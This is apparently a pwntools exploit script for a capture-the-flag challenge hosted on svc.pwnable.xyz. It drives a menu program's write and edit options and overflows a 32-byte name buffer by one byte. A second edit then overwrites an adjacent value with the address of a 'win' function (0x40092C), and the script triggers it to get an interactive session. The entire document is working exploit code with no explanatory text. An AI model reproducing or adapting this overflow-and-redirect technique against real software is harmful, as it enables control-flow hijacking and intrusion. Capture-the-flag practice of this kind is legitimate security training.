from pwn import *

#s = process("./challenge")
s = remote("svc.pwnable.xyz",30023)

def write(name):
	s.recvuntil("> ")
	s.sendline("1")
	s.recvuntil("name: ")
	s.send(name)

def edit(idx,name):
	s.recvuntil("> ")
	s.sendline("2")
	s.recvuntil("index: ")
	s.sendline(str(idx))
	s.recvuntil("name: ")
	s.send(name)

#pause()

win = 0x40092C

write("A"*32)
edit(0,"A"*32+"\x41")

edit(0,"A"*40+p64(win))

s.recvuntil("> ")
s.sendline("3")
s.recvuntil("index: ")
s.sendline("0")

s.interactive()
